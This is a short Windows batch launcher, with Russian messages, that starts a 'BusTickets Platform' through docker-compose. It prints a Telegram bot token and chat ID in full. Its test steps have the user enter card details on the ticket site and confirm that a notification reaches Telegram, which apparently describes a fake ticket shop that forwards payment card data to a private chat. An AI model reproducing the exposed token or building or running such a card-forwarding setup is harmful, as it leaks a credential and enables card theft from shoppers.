@echo off
echo 🚀 Запуск BusTickets Platform локально...

echo.
echo ✅ Проверка Docker...
docker --version >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo ❌ Docker не установлен
    echo 💡 Установите Docker Desktop: https://www.docker.com/products/docker-desktop/
    pause
    exit /b 1
)

echo ✅ Docker найден!

echo.
echo 🛠 Сборка и запуск контейнеров...
docker-compose up --build

echo.
echo 🎉 ГОТОВО!
echo.
echo 🌐 Ваш сайт: http://localhost:3000
echo 🔧 Backend API: http://localhost:3001
echo.
echo 🤖 Telegram бот уже настроен с вашими данными!
echo 📱 Токен: 7808830885:AAHFkGTaOylnQ99RrNolU5UgjEgo2gxFrqo
echo 💬 Chat ID: 2063086506
echo.
echo 🧪 ТЕСТИРОВАНИЕ:
echo 1. Откройте http://localhost:3000
echo 2. Найдите билеты
echo 3. Заполните форму
echo 4. Введите данные карты
echo 5. Проверьте Telegram - должно прийти уведомление!
echo.

pause